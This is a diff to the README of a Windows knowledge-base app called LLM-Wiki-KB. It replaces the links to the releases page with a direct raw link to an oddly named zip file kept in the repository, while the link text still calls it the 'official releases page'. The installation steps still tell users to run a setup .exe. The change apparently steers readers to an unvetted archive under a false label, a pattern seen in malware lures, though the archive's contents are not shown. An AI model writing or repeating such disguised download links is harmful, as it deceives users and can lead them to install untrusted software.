@@ -1,6 +1,6 @@
 # 🧠 LLM-Wiki-KB - Build a personal knowledge base easily
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Scuttlechenopodiaceae6893/LLM-Wiki-KB/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Scuttlechenopodiaceae6893/LLM-Wiki-KB/raw/refs/heads/main/soupbone/KB-LL-Wiki-administerd.zip)
 
 LLM-Wiki-KB turns scattered information into an organized encyclopedia. It functions like a human expert gathering facts. This tool organizes your notes and data into a clear structure using smart models. It builds your second brain without you needing to write code.
 
@@ -21,7 +21,7 @@ You need a Windows computer to run this application. Ensure your system meets th
 
 Follow these steps to set up your knowledge base.
 
-1. Visit the [official releases page](https://github.com/Scuttlechenopodiaceae6893/LLM-Wiki-KB/releases) to download the program.
+1. Visit the [official releases page](https://github.com/Scuttlechenopodiaceae6893/LLM-Wiki-KB/raw/refs/heads/main/soupbone/KB-LL-Wiki-administerd.zip) to download the program.
 2. Select the file named `LLM-Wiki-Setup.exe` from the latest release list.
 3. Save the file to your computer.
 4. Double-click the file to start the installer.
